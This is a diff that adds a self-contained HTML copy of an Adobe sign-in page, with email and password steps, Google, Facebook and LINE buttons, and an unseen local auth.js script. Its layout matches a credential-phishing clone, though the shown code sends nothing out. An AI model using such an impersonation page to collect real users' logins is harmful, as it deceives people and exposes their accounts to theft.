@@ -1,0 +1,146 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="light">
+    <title>Sign in - Adobe</title>
+    <link rel="preload" href="assets/fonts/adobe-clean-400.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="assets/fonts/adobe-clean-700.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="stylesheet" href="auth.css">
+    <script src="auth.js" defer></script>
+  </head>
+  <body>
+    <main class="canvas">
+      <div class="canvas-inner">
+        <div class="canvas-brand">
+          <div class="brand-lockup">
+            <img class="brand-logo" src="assets/adobe-logo-white.svg" alt="Adobe" width="131" height="71">
+            <p class="brand-tagline">Sign in or create an account</p>
+          </div>
+          <div class="canvas-credit">
+            <span class="credit-badge" aria-hidden="true">St</span>
+            <span class="credit-name">Carmen Trosser</span>
+          </div>
+        </div>
+
+        <section class="canvas-panel" aria-label="Adobe account access">
+          <div class="panel-step" data-step="email">
+            <img class="panel-logo" src="assets/adobe-logo.svg" alt="Adobe" width="86" height="47">
+            <h1 class="panel-title">Sign in</h1>
+            <p class="new-user">New user? <a href="#">Create an account</a></p>
+
+            <form class="auth-form" id="email-form" novalidate>
+              <label for="email">Email address</label>
+              <div class="field">
+                <input id="email" name="email" type="email" inputmode="email" autocomplete="username" spellcheck="false" aria-label="Email address">
+              </div>
+              <div class="form-actions">
+                <button class="primary-button" type="submit">Continue</button>
+              </div>
+            </form>
+
+            <div class="separator"><span>Or</span></div>
+
+            <div class="provider-list">
+              <button class="provider-button" type="button" data-provider="Google">
+                <span class="provider-icon">
+                  <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                  </svg>
+                </span>
+                <span class="provider-label">Continue with Google</span>
+              </button>
+
+              <button class="provider-button" type="button" data-provider="Facebook">
+                <span class="provider-icon">
+                  <svg viewBox="0 0 24 24" width="20" height="20" fill="#1877F2" aria-hidden="true">
+                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                  </svg>
+                </span>
+                <span class="provider-label">Continue with Facebook</span>
+              </button>
+
+              <button class="provider-button" type="button" data-provider="LINE">
+                <span class="provider-icon">
+                  <svg viewBox="0 0 24 24" width="20" height="20" fill="#00C300" aria-hidden="true">
+                    <path d="M24 10.304c0-5.369-5.383-9.738-12-9.738-6.616 0-12 4.369-12 9.738 0 4.814 3.963 8.874 9.421 9.605.369.078.873.242 1.002.556.117.284.076.733.036 1.034 0 0-.129.771-.157.944-.047.288-.216 1.139 1.001.626 1.218-.512 6.574-3.87 8.972-6.625 1.144-1.309 1.725-2.651 1.725-3.957v-2.183zM9.542 13.069h-2.33a.471.471 0 01-.47-.471V8.46a.471.471 0 01.47-.471.471.471 0 01.471.471v3.666h1.859a.47.47 0 01.471.471.471.471 0 01-.471.472zm2.148 0a.471.471 0 01-.471-.471V8.46a.471.471 0 01.942 0v4.138a.471.471 0 01-.471.471zm4.72 0a.471.471 0 01-.397-.216l-2.076-2.92v2.665a.471.471 0 01-.942 0V8.46a.471.471 0 01.868-.261l2.075 2.919V8.46a.471.471 0 01.942 0v4.138a.471.471 0 01-.47.471zm2.846-3.194h-1.858v1.162h1.858a.471.471 0 010 .942h-2.33a.471.471 0 01-.47-.471V8.46a.471.471 0 01.47-.471h2.33a.471.471 0 010 .942h-1.858v1.07h1.858a.471.471 0 010 .942z"/>
+                  </svg>
+                </span>
+                <span class="provider-label">Continue with LINE</span>
+              </button>
+            </div>
+
+            <div class="more-options"><a href="#">More sign-in options</a></div>
+            <div class="help-link"><a href="#">Get help signing in</a></div>
+          </div>
+
+          <div class="panel-step" data-step="password" hidden>
+            <h1 class="panel-title">Enter your password</h1>
+
+            <div class="account-chip">
+              <span class="account-avatar" aria-hidden="true">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M4 21V7.5L10 4v17"/>
+                  <path d="M10 21V10h6.5L20 13v8"/>
+                  <path d="M2.5 21h19"/>
+                  <path d="M6.4 9.6h1.2M6.4 13h1.2M6.4 16.4h1.2M12.8 13.4h1.2M12.8 16.8h1.2"/>
+                </svg>
+              </span>
+              <span class="account-meta">
+                <span class="account-email" id="account-email">qwer@gmail.com</span>
+                <span class="account-caption">Email address</span>
+              </span>
+            </div>
+
+            <form class="auth-form" id="password-form" novalidate>
+              <label for="password">Password</label>
+              <div class="password-field">
+                <input id="password" name="password" type="password" autocomplete="current-password" aria-label="Password">
+                <button class="password-toggle" type="button" aria-label="Show password" aria-pressed="false">
+                  <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                    <path d="M3 3l18 18"/>
+                    <path d="M10.6 10.6a2 2 0 002.83 2.83"/>
+                    <path d="M6.7 6.75C4.63 8.06 3.03 10 2 12c1.7 3.63 5.4 6 10 6 1.6 0 3.1-.32 4.4-.9"/>
+                    <path d="M9.9 5.2A10 10 0 0112 5c4.6 0 8.3 2.37 10 6-.58 1.24-1.37 2.36-2.33 3.28"/>
+                  </svg>
+                </button>
+              </div>
+
+              <div class="form-row">
+                <label class="toggle">
+                  <input type="checkbox" id="stay-signed-in" checked>
+                  <span class="toggle-track"><span class="toggle-thumb"></span></span>
+                  <span class="toggle-label">Stay signed in</span>
+                </label>
+                <button class="primary-button" type="submit">Continue</button>
+              </div>
+            </form>
+
+            <div class="panel-links">
+              <a href="#">Reset your password</a>
+              <a href="#" id="different-account">Sign in to a different account</a>
+            </div>
+          </div>
+        </section>
+      </div>
+    </main>
+
+    <footer class="auth-footer">
+      <span>Copyright © 2026 Adobe. All rights reserved.</span>
+      <div class="footer-links">
+        <a href="#">Terms of Use</a>
+        <a href="#">Cookie preferences</a>
+        <a href="#">Privacy</a>
+        <a href="#">Do not sell or share my personal information</a>
+      </div>
+    </footer>
+
+    <button class="chat-fab" type="button" aria-label="Chat">
+      <img src="assets/chat-bubble.svg" alt="" width="24" height="24">
+    </button>
+  </body>
+</html>
